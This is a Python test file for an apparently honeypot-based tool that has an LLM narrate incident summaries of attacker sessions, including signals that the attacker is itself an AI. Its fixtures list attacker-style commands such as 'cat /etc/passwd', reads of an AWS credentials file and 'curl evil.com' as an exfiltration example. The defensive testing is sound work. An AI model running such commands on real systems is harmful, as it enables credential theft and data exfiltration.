"""Tests for the LLM-narrated incident summary tier.

We test against a FakeLLM that records the prompts and returns a
deterministic response. Two layers:

  1. Prompt assembly — NarrativeInput.to_prompt() correctly serializes
     the engagement structure (all sections present, length-capped).
  2. End-to-end — input_from_engagement(eng_dict) builds a NarrativeInput
     that gets handed to narrate() and returns the LLM's output verbatim.
"""
import sys
from pathlib import Path

import pytest

from plenith.narrate import (
    NarrativeInput,
    SYSTEM_PROMPT,
    input_from_engagement,
    narrate,
)


# ---------------------------------------------------------------------------
# FakeLLM (separate from conftest's FakeLLM to record system prompts too)
# ---------------------------------------------------------------------------

class _RecordingLLM:
    """LLM stub that captures every (system, user) pair and returns a
    fixed response. Lets tests assert on the prompt shape."""
    def __init__(self, response: str = "WHAT HAPPENED.\n\nWHAT WE LEARNED.\n\n- recommendation one\n- recommendation two"):
        self.response = response
        self.calls = []

    async def complete(self, system: str, user: str) -> str:
        self.calls.append({"system": system, "user": user})
        return self.response


# ---------------------------------------------------------------------------
# NarrativeInput.to_prompt
# ---------------------------------------------------------------------------

class TestPromptAssembly:
    def _inp(self, **overrides):
        defaults = dict(
            engagement_id="abcd1234-0000-0000-0000-000000000000",
            claimed_user="jdoe",
            source_ip="192.0.2.99",
            duration_seconds=124.5,
            connection_count=2,
            persona="jdoe",
            commands=["whoami", "id", "cat /etc/passwd"],
            alerts=[{"action": "alert_credential_exfil", "severity": "high",
                     "rationale": "creds file read"}],
            iocs=["/home/jdoe/.aws/credentials"],
            decoys_swallowed=["/etc/sudoers.d/zzz_compat"],
            decoys_planted=["/etc/sudoers.d/zzz_compat"],
        )
        defaults.update(overrides)
        return NarrativeInput(**defaults)

    def test_all_sections_present(self):
        body = self._inp().to_prompt()
        for needle in ("ENGAGEMENT_ID", "CLAIMED_USER", "SOURCE_IP",
                       "COMMANDS_OBSERVED", "ALERTS_FIRED",
                       "DECOYS_PLANTED", "DECOYS_SWALLOWED",
                       "IOCS_EXTRACTED"):
            assert needle in body, f"missing section {needle!r}"
        # Trailing instruction
        assert "Write the summary now" in body

    def test_command_list_capped(self):
        cmds = [f"cmd{i}" for i in range(100)]
        body = self._inp(commands=cmds).to_prompt()
        # Should show 60 + an elision marker
        assert "60." in body
        assert "more elided" in body
        # And NOT the 100th command
        assert "cmd99" not in body

    def test_counter_ai_section_when_set(self):
        body = self._inp(counter_ai={
            "confidence": 0.85,
            "proven":     True,
            "signals":    {"timing": 0.7, "lexical_avg": 0.6},
        }).to_prompt()
        assert "COUNTER_AI_SIGNALS" in body
        assert "0.85" in body
        assert "proven_by_trap: True" in body

    def test_counter_ai_omitted_when_none(self):
        body = self._inp(counter_ai=None).to_prompt()
        assert "COUNTER_AI_SIGNALS" not in body

    def test_no_decoys_no_decoy_section(self):
        body = self._inp(decoys_planted=[], decoys_swallowed=[]).to_prompt()
        # Both sections should be absent
        assert "DECOYS_PLANTED" not in body
        assert "DECOYS_SWALLOWED" not in body

    def test_long_rationale_truncated(self):
        super_long = "x" * 500
        body = self._inp(alerts=[{
            "action": "alert_x", "severity": "low", "rationale": super_long,
        }]).to_prompt()
        # Should NOT contain the full 500 x's
        assert "x" * 500 not in body
        assert "alert_x" in body


# ---------------------------------------------------------------------------
# narrate() E2E
# ---------------------------------------------------------------------------

class TestNarrateE2E:
    @pytest.mark.asyncio
    async def test_narrate_calls_llm_and_returns_response(self):
        llm = _RecordingLLM("the-narrative-body")
        inp = NarrativeInput(
            engagement_id="abcd",
            claimed_user="jdoe", source_ip="10.0.0.1",
            duration_seconds=10, connection_count=1, persona="jdoe",
            commands=["whoami"], alerts=[], iocs=[],
            decoys_swallowed=[], decoys_planted=[],
        )
        out = await narrate(inp, llm)
        assert out == "the-narrative-body"
        assert len(llm.calls) == 1
        assert llm.calls[0]["system"] == SYSTEM_PROMPT
        assert "abcd" in llm.calls[0]["user"]

    @pytest.mark.asyncio
    async def test_system_prompt_specifies_three_parts(self):
        # The system prompt must instruct the LLM about format
        for needle in ("THREE", "WHAT HAPPENED", "WHAT WE LEARNED",
                       "RECOMMENDED RESPONSE"):
            assert needle in SYSTEM_PROMPT


# ---------------------------------------------------------------------------
# input_from_engagement
# ---------------------------------------------------------------------------

class TestInputFromEngagement:
    def test_basic_conversion(self):
        eng = {
            "engagement_id": "abc-123",
            "claimed_user":  "jdoe",
            "source_ip":     "192.0.2.5",
            "dwell_seconds": 88.0,
            "connection_count": 3,
            "persona":       "jdoe",
            "commands":      [
                {"cmd": "whoami"},
                {"cmd": "id"},
                {"cmd": "cat /etc/passwd"},
            ],
            "actions_taken": [
                {"action": "alert_credential_exfil", "severity": "high",
                 "rationale": "creds read"},
            ],
            "observed": {
                "dns_exfil_commands":   ["curl evil.com"],
                "credential_files_read": ["/home/jdoe/.aws/credentials"],
                "decoys_swallowed":     ["/etc/sudoers.d/zzz_compat"],
                "decoys_planted":       ["/etc/sudoers.d/zzz_compat"],
            },
        }
        inp = input_from_engagement(eng)
        assert inp.engagement_id == "abc-123"
        assert inp.claimed_user == "jdoe"
        assert inp.commands == ["whoami", "id", "cat /etc/passwd"]
        assert inp.alerts[0]["action"] == "alert_credential_exfil"
        # IoCs aggregated + de-duped
        assert "/home/jdoe/.aws/credentials" in inp.iocs
        assert "curl evil.com" in inp.iocs
        # Counter-AI absent
        assert inp.counter_ai is None

    def test_counter_ai_extracted_when_flagged(self):
        eng = {
            "engagement_id": "abc",
            "claimed_user":  "jdoe",
            "source_ip":     "10.0.0.1",
            "dwell_seconds": 50,
            "connection_count": 1,
            "commands":      [],
            "actions_taken": [],
            "observed":      {
                "attacker_likely_llm":          True,
                "attacker_llm_confidence":      0.78,
                "attacker_llm_signals":         {"timing": 0.7, "lexical_avg": 0.6},
                "attacker_llm_proven_via_trap": False,
            },
        }
        inp = input_from_engagement(eng)
        assert inp.counter_ai is not None
        assert inp.counter_ai["confidence"] == 0.78
        assert inp.counter_ai["proven"] is False

    def test_missing_fields_dont_crash(self):
        """Partial engagement (no observed, no commands) still produces input."""
        eng = {"engagement_id": "xyz"}
        inp = input_from_engagement(eng)
        assert inp.engagement_id == "xyz"
        assert inp.commands == []
        assert inp.alerts == []

    def test_commands_as_plain_strings_also_accepted(self):
        eng = {
            "engagement_id": "abc",
            "commands": ["whoami", "id", {"cmd": "ls"}],
        }
        inp = input_from_engagement(eng)
        assert inp.commands == ["whoami", "id", "ls"]
